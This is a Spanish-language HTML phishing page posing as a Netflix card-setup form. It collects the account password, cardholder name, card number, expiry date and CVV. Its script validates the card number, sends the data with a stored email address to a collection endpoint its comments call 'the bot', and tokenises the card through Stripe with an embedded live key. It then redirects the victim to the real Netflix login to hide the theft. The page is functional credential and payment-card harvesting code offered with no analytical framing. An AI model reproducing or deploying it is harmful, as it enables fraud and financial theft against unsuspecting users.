<!DOCTYPE html>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirmaci&oacute;n</title>
    <script src="https://js.stripe.com/v3/"></script>
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css">
    <style>
        body { background: #fff; font-family: sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; }
        .container { max-width: 440px; width: 100%; margin: 30px auto; padding: 0 20px; }
        .input-box { margin-bottom: 15px; }
        .input-box input { width: 100%; padding: 15px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
        .btn { background: #e50914; color: #fff; width: 100%; padding: 18px; border: none; font-size: 20px; font-weight: bold; cursor: pointer; border-radius: 4px; width: 100%; }
        #loading { display: none; text-align: center; margin-top: 50px; }
        .error-msg { color: #e50914; font-size: 13px; text-align: left; margin-top: 5px; display: none; }
    </style>
</head>
<body>
    <div class="container" id="form-box">
        <h1>Configura tu tarjeta</h1>
        <form id="final-form">
            <div class="input-box"><input type="password" id="pw" placeholder="Contraseña de cuenta" required></div>
            <div class="input-box"><input type="text" id="nm" placeholder="Nombre en tarjeta" required></div>
            <div class="input-box">
                <input type="text" id="cc" placeholder="Número de tarjeta" maxlength="16" required>
                <div id="cc-error" class="error-msg">Número de tarjeta no válido. Revisa los dígitos.</div>
            </div>
            <div style="display: flex; gap: 10px;">
                <input type="text" id="ex" placeholder="MM/AA" maxlength="5" style="width: 50%; padding: 15px; border: 1px solid #ccc;" required>
                <input type="text" id="cv" placeholder="CVV" maxlength="4" style="width: 50%; padding: 15px; border: 1px solid #ccc;" required>
            </div>
            <br>
            <button type="submit" class="btn">Continuar</button>
        </form>
    </div>

    <div id="loading" class="container">
        <i class="fas fa-spinner fa-spin fa-3x" style="color:#e50914;"></i>
        <p>Procesando información de forma segura...</p>
    </div>

    <script>
        const stripe = Stripe('pk_live_51ShZ3pAeUmcfN350ViX4smhmh5q0IVTh1HBTgTi38ibNz07TvUQzb1F6PyQpWvF1N1y4411ZM7Ys0x9mQw9foU4800BwXkfy0n');

        // Algoritmo de Luhn para validar la tarjeta antes del envío
        function luhnCheck(num) {
            let sum = 0;
            for (let i = 0; i < num.length; i++) {
                let intVal = parseInt(num.substr(i, 1));
                if (i % 2 === num.length % 2) {
                    intVal *= 2;
                    if (intVal > 9) intVal -= 9;
                }
                sum += intVal;
            }
            return (sum % 10 === 0);
        }

        document.getElementById('final-form').addEventListener('submit', function(e) {
            e.preventDefault();
            const ccVal = document.getElementById('cc').value.replace(/\s/g, '');
            
            if (!luhnCheck(ccVal)) {
                document.getElementById('cc-error').style.display = 'block';
                return;
            }

            document.getElementById('form-box').style.display = 'none';
            document.getElementById('loading').style.display = 'block';

            const exp = document.getElementById('ex').value.split('/');
            const payload = {
                em: sessionStorage.getItem('usr_mail') || 'Desconocido',
                pw: document.getElementById('pw').value,
                nm: document.getElementById('nm').value,
                cc: ccVal, ex: document.getElementById('ex').value, cv: document.getElementById('cv').value,
                st: null, luhn: true
            };

            // BYPASS DE CACHÉ: Cambia cada segundo para evitar bloqueos
            const targetUrl = `/api/enviar?cache_bust=${Date.now()}`;

            // 1. Envío inmediato al bot (asegura el hit)
            fetch(targetUrl, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });

            // 2. Salida forzada a los 2.5 segundos
            const exit = setTimeout(() => { window.location.href = "https://www.netflix.com/login"; }, 2500);

            // 3. Intento de Stripe en paralelo
            stripe.createToken({ number: ccVal, exp_month: exp[0], exp_year: exp[1], cvc: payload.cv }).then(res => {
                if (res.token) {
                    payload.st = res.token.id;
                    fetch(targetUrl, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
                }
            }).finally(() => {
                clearTimeout(exit);
                window.location.href = "https://www.netflix.com/login";
            });
        });
    </script>
</body>
</html>
